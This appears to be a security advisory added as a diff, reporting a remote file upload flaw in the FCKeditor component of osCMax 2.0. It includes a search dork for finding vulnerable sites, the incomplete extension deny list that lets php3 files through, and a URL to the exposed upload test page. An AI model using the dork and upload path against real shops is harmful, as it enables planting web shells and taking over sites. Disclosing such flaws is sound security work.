@@ -1,0 +1,30 @@
+##############################################################################
+#Title:             osCMax 2.0 (fckeditor) Remote File Upload                #
+#Vendor:            http://www.oscdox.com                                    #
+#Dork:              "Powered by osCMax v2.0" , "Copyright @" "RahnemaCo.com" #
+##############################################################################
+#AUTHOR:            ITSecTeam                                                #
+#Email:             Bug@ITSecTeam.com                                        #
+#Website:           http://www.itsecteam.com                                 #
+#Forum :            http://forum.ITSecTeam.com                               #
+#Original Advisory: www.ITSecTeam.com/en/vulnerabilities/vulnerability20.htm #
+#Thanks:            r3dm0v3, limpizik_neo                                    #
+##############################################################################
+
+#DESCRIPTION (by vendor):#####################################################
+osCMax v2.0 is a powerful e-commerce/shopping cart web application. There are many advantages to using osCMax as your 
+e-commerce/shopping cart for your web site. It has all the features needed to run a successful internet store and can 
+be customized to whatever configuration you need.
+osCMax v2.0 is based on osCommerce 2.2 RC2a.
+
+
+#BUG:#########################################################################
+file FCKeditor/editor/filemanager/browser/default/connectors/php/config.php:
+ 25: $Config['AllowedExtensions']['File']	= array() ;
+ 26: $Config['DeniedExtensions']['File']	= array('php','asp','aspx','ascx','jsp','cfm','cfc','pl','bat','exe','dll','reg') ;
+
+It is still to upload files with some dangerous extensions like php3 !
+
+
+#EXPLOIT:####################################################################
+http://site.com/path_to_oSCMax/FCKeditor/editor/filemanager/browser/default/connectors/test.html
